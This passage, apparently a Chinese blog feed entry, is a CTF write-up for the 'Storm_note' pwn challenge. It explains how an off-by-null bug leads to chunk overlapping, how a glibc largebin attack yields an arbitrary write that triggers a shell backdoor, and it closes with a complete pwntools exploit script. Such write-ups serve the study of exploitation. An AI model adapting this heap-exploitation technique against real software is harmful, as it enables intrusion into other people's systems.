0)</code>禁用了fastbin，然后通过mmap在0xABCD0000分配了一个页面的可读可写空间，最后往里面写入一个随机数。 </p><p><img src="https://s2.loli.net/2021/12/26/jcaBrYehQ29wHJp.png"></p><h4 id="alloc-note函数"><a href="#alloc-note函数" class="headerlink" title="alloc_note函数"></a>alloc_note函数</h4><p>​    首先遍历全局变量note，找到一个没有存放内容的地方保存堆指针。然后限定了申请的堆的大小最多为0xFFFFF，调用calloc函数来分配堆空间，因此返回</p><p>前会对分配的堆的内容进行清零。</p><p> <img src="https://s2.loli.net/2021/12/26/BgMTDC7jNW9Vnbc.png"></p><h4 id="edit-note函数"><a href="#edit-note函数" class="headerlink" title="edit_note函数"></a>edit_note函数</h4><p>​     存在一个off_by_null漏洞，在read后v2保存写入的字节数，最后在该偏移处的字节置为0，形成off_by_null。</p><p> <img src="https://s2.loli.net/2021/12/26/NcRMZmEYb3sAyVp.png">    </p><h4 id="delete-note函数"><a href="#delete-note函数" class="headerlink" title="delete_note函数"></a>delete_note函数</h4><p>​    这个函数就是正常free堆指针，并置0。</p><p> <img src="https://s2.loli.net/2021/12/26/sS1oNBz9LEM5UdQ.png"></p><h4 id="backdoor函数"><a href="#backdoor函数" class="headerlink" title="backdoor函数"></a>backdoor函数</h4><p>​    程序提供一个可以直接getshell的后门，触发的条件就是输入的数据与mmap映射的空间的前48个字节相同。</p><p> <img src="https://s2.loli.net/2021/12/26/m3eKYposyubTgCq.png"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li><p>利用off_by_null漏洞实现chunk overlapping，从而控制堆块内容。</p></li><li><p>将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack</p></li><li><p>伪造largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写。</p></li><li><p>触发后门</p></li></ol><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><h4 id="1-Chunk-overlapping"><a href="#1-Chunk-overlapping" class="headerlink" title="1.Chunk overlapping"></a>1.Chunk overlapping</h4><p>​    首先分配7个chunk，chunk1和chunk4是用于放入largebin的大chunk，chunk6防止top chunk合并。Chunk结构如下。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#2</span><br><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/26/1Z9ExJODHmry2uw.png"></p><p>​    构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。如下图所示。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/26/IQHym7GTUNXRkE4.png"></p><p>​    接着利用off by null漏洞改写chunk 1的size为0x500。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/26/x2lRQHnNWmoy6b1.png"></p><p>​    然后就可以进行chunk overlap了, 先将0x20的chunk释放掉，然后释放chunk2，这时触发unlink。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4d8</span>) <span class="hljs-comment">#7 </span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)    <span class="hljs-comment">#overlap</span><br></code></pre></td></tr></table></figure><p> <img src="https://s2.loli.net/2021/12/26/6N4o2xGqDPghuHO.png"></p><p>​    接下来用同样的方法对第二个大小为0x510的chunk进行overlapping。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br>add(<span class="hljs-number">0x18</span>)        <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x4d8</span>)       <span class="hljs-comment">#8 </span><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)          <span class="hljs-comment">#overlap</span><br>add(<span class="hljs-number">0x40</span>)        <span class="hljs-comment">#4 </span><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="2-放入large-bin"><a href="#2-放入large-bin" class="headerlink" title="2.放入large bin"></a>2.放入large bin</h4><p>​    那么如何将unsorted bin中的chunk放入large bin呢？下面是glibc判断</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="hljs-comment">//从第一个unsortedbin的bk开始遍历</span><br>&#123;<br>    bck = victim-&gt;bk;<br>    size = chunksize (victim);<br>    <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<span class="hljs-comment">//&lt;_int_malloc+627&gt;</span><br>        bck == unsorted_chunks (av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE))    <span class="hljs-comment">//unsorted_bin的最后一个，并且该bin中的最后一个chunk的size大于我们申请的大小</span><br>    &#123;remainder_size = size - nb;<br>     remainder = chunk_at_offset (victim, nb);...&#125;<span class="hljs-comment">//将选中的chunk剥离出来，恢复unsortedbin</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>     unsorted_chunks (av)-&gt;bk = bck;    <span class="hljs-comment">//largebin attack</span><br>    <span class="hljs-comment">//注意这个地方，将unsortedbin的bk设置为victim-&gt;bk，如果我设置好了这个bk并且能绕过上面的检查,下次分配就能将target chunk分配出来</span><br>    <span class="hljs-keyword">if</span> (size == nb)<span class="hljs-comment">//size相同的情况同样正常分配</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (size))<span class="hljs-comment">//放入smallbin</span><br>     &#123;<br>        victim_index = smallbin_index (size);<br>        bck = bin_at (av, victim_index);<br>        fwd = bck-&gt;fd;<br>     &#125;<br>     <span class="hljs-keyword">else</span><span class="hljs-comment">//放入large bin</span><br>     &#123;<br>         <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask (fwd))<br>         &#123;<br>            fwd = fwd-&gt;fd_nextsize;<span class="hljs-comment">//fd_nextsize指向比当前chunk小的下一个chunk</span><br>            assert (chunk_main_arena (fwd));<br>          &#125;<br>          <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size<br>                          == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask (fwd))<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>             fwd = fwd-&gt;fd;<br>          <span class="hljs-keyword">else</span><span class="hljs-comment">// 插入</span><br>          &#123;<br>            <span class="hljs-comment">//解链操作，nextsize只有largebin才有</span><br>            victim-&gt;fd_nextsize = fwd;<br>            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>            fwd-&gt;bk_nextsize = victim;<br>            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span><br>           &#125;<br>          bck = fwd-&gt;bk;<br>      &#125;<br>   &#125;<br> <span class="hljs-keyword">else</span><br>     victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>&#125;<br> mark_bin (av, victim_index);<br><span class="hljs-comment">//解链操作2,fd,bk</span><br> victim-&gt;bk = bck;<br> victim-&gt;fd = fwd;<br> fwd-&gt;bk = victim;<br> bck-&gt;fd = victim;<br><span class="hljs-comment">//fwd-&gt;bk-&gt;fd=victim</span><br></code></pre></td></tr></table></figure><p>​    大概意思就是说我们申请堆块时，glibc会从unsorted bin末尾开始遍历，倘若遍历到不符合我们的要求大小，那么系统会做sorted——重新把这个free chunk放入small bin或large bin中。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#unsortedbin-&gt; chunk2 -&gt; chunk5(0x4e0)which size is largebin FIFO</span><br>add(<span class="hljs-number">0x4e8</span>)  <span class="hljs-comment">#put chunk5(0x4e0) to largebin</span><br>free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#put chunk2 to unsortedbin</span><br></code></pre></td></tr></table></figure><p>​    这个过程就是，在unsorted bin中存放着两个大chunk，第一个0x4e0，第二个0x4f0。当我申请一个0x4e8的chunk时，首先找到0x4e0的chunk，太小了不符合调件，于是将它拿出unsorted bin，放入large bin。在放入large bin时就会进行两步解链操作，两个解链操作的最后一步是关键。</p><p> <img src="https://s2.loli.net/2021/12/26/rlAmkNfTFjqy6aX.png"></p><p>​    可以看到从unsorted bin-&gt;bk开始遍历，第一个的size &lt; nb因此就会放入large bin，继续往前遍历，找到0x4f0的chunk，刚好满足size==nb，因此将其分配出来。最后在free(2)将刚刚分配的chunk2再放回unsorted bin，进行第二次利用。</p><p> <img src="https://s2.loli.net/2021/12/26/nR4rjuL1OTYPeQJ.png"></p><h4 id="3-large-bin-attack"><a href="#3-large-bin-attack" class="headerlink" title="3.large bin attack"></a>3.large bin attack</h4><p>​    接下来伪造unsorted bin的bk</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">content_addr = <span class="hljs-number">0xabcd0100</span><br>fake_chunk = content_addr - <span class="hljs-number">0x20</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4f1</span>) <span class="hljs-comment"># size</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      <span class="hljs-comment"># bk</span><br>edit(<span class="hljs-number">7</span>, payload)<br></code></pre></td></tr></table></figure><p>​    效果图如下。</p><p> <img src="https://s2.loli.net/2021/12/26/nAIwNXGPojFuUD4.png"></p><p>​    再伪造large bin的bk和bk_nextsize。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4e1</span>)  <span class="hljs-comment">#size</span><br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>)   <br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<span class="hljs-comment">#mmap</span><br>edit(<span class="hljs-number">8</span>, payload2)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/26/ON9vpwZRDUVMgnj.png"></p><p>​    那么为什么修改这些值呢，再回顾一下两个解链操作。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><span class="hljs-comment">// 插入</span><br>          &#123;<br>            <span class="hljs-comment">//解链操作，nextsize只有largebin才有</span><br>            victim-&gt;fd_nextsize = fwd;<br>            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>            fwd-&gt;bk_nextsize = victim;<br>            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span><br>           &#125;<br>          bck = fwd-&gt;bk;<br>      &#125;<br>   &#125;<br> <span class="hljs-keyword">else</span><br>     victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>&#125;<br> mark_bin (av, victim_index);<br><span class="hljs-comment">//解链操作2,fd,bk</span><br> victim-&gt;bk = bck;<br> victim-&gt;fd = fwd;<br> fwd-&gt;bk = victim;<br> bck-&gt;fd = victim;<br><span class="hljs-comment">//fwd-&gt;bk-&gt;fd=victim</span><br></code></pre></td></tr></table></figure><p>   这里情况很复杂，需要耐心把每一步链表的操作搞明白，才能理解它的原理。首先victim指的是处在unsorted bin中的堆块，fwd是large bin中的堆块。</p><p>  再来回顾一下我们的构造：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;bk = fake_chunk<br>fwd-&gt;bk = fake_chunk+<span class="hljs-number">8</span><br>fwd-&gt;bk_nextsize=fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span><br></code></pre></td></tr></table></figure><p>  通过解链操作1，我们能得到：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;fd_nextsize=fwd<br>victim-&gt;bk_nextsize=fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span><br>fwd-&gt;bk_nextsize=victim<br>victim-&gt;bk_nextsize-&gt;fd_nextsize=fake_chunk<span class="hljs-number">-0x18</span><span class="hljs-number">-5</span>+<span class="hljs-number">0x20</span>=fake_chunk+<span class="hljs-number">3</span>=victim<br></code></pre></td></tr></table></figure><p>  通过解链操作2，我们能得到：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;bk = bck = fwd-&gt;bk = fake_chunk+ <span class="hljs-number">8</span><br>victim-&gt;fd = largbin_entry<br>fwd-&gt;bk = victim<br>bck-&gt;fd = (fake_chunk +<span class="hljs-number">8</span>)-&gt;fd = victim<br></code></pre></td></tr></table></figure><p>  接下来我们可以观察一下调试的结果是否与我们分析的一致。</p><p> <img src="https://s2.loli.net/2021/12/26/ekC8BfcU2sgn9VI.png"></p><p> <img src="D:\blog\source_posts\images\image-20211226162928596-16405140388352.png" alt="image-20211226162928596"></p><p>  因为fake_chunk-5处会写入victim的地址，开启地址随机化的开头地址是0x55或0x56，所以fake_chunk的size位是0x55或0x56。</p><p>  当_int_malloc返回之后会进行如下检查。</p><p> <img src="https://s2.loli.net/2021/12/26/Z743qRXiQmeB8TY.png"></p><p>  其中宏定义如下。</p><p> <img src="https://s2.loli.net/2021/12/26/KgAflpt5n1JNHZE.png"></p><p>  0x55&amp;0x2=0，绕不过检查，所以只有size为0x56时，我们才能申请到0xabcd0100-0x20处的堆块。</p><h4 id="4-后门利用"><a href="#4-后门利用" class="headerlink" title="4.后门利用"></a>4.后门利用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x48</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>edit(<span class="hljs-number">2</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure><p>  申请到目标堆块后，将0Xabcd0100处的随机数改为0，触发后门。</p><p> <img src="https://s2.loli.net/2021/12/26/H9ju6V8PoMCXhGO.png"></p><p> <img src="https://s2.loli.net/2021/12/26/Hj3nSoEiYXfrMgw.png"></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./Storm_note&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br> p = process(binary)<br><span class="hljs-keyword">else</span>:<br> p = remote(<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;?\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;?\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br> p.sendafter(<span class="hljs-string">&#x27;\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br> p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br> p.sendlineafter(<span class="hljs-string">&#x27;?\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br>gdb.attach(p)<br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#2</span><br><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#6</span><br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4d8</span>) <span class="hljs-comment">#7 </span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)    <span class="hljs-comment">#overlap</span><br><br><br><span class="hljs-comment">#recover</span><br>add(<span class="hljs-number">0x30</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4e0</span>) <span class="hljs-comment">#2</span><br><br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br>add(<span class="hljs-number">0x18</span>)        <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x4d8</span>)       <span class="hljs-comment">#8 </span><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)          <span class="hljs-comment">#overlap</span><br>add(<span class="hljs-number">0x40</span>)        <span class="hljs-comment">#4 </span><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># pause()</span><br><br>free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#unsortedbin-&gt; chunk2 -&gt; chunk5(0x4e0)    which size is largebin FIFO</span><br>add(<span class="hljs-number">0x4e8</span>)  <span class="hljs-comment">#put chunk5(0x4e0) to largebin</span><br>free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#put chunk2 to unsortedbin</span><br><br>content_addr = <span class="hljs-number">0xabcd0100</span><br>fake_chunk = content_addr - <span class="hljs-number">0x20</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4f1</span>) <span class="hljs-comment"># size</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      <span class="hljs-comment"># bk</span><br>edit(<span class="hljs-number">7</span>, payload)<br><br>payload2 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4e1</span>)  <span class="hljs-comment">#size</span><br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>)   <br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<span class="hljs-comment">#mmap</span><br>edit(<span class="hljs-number">8</span>, payload2)<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x48</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>edit(<span class="hljs-number">2</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.wangan.com/docs/pwn-base">https://www.wangan.com/docs/pwn-base</a></p><p><a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/">https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/</a> </p><p><a href="https://www.yuque.com/hxfqg9/bin/ape5up">https://www.yuque.com/hxfqg9/bin/ape5up</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.8_heap_exploit_3.md">https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.8_heap_exploit_3.md</a></p><p><a href="https://www.freebuf.com/articles/system/209096.html">https://www.freebuf.com/articles/system/209096.html</a></p><p><a href="https://www.anquanke.com/post/id/176194#h2-3">https://www.anquanke.com/post/id/176194#h2-3</a></p><p><a href="https://zhuanlan.zhihu.com/p/213904612">https://zhuanlan.zhihu.com/p/213904612</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆基础知识</title>
    <link href="/2021/12/26/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2021/12/26/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
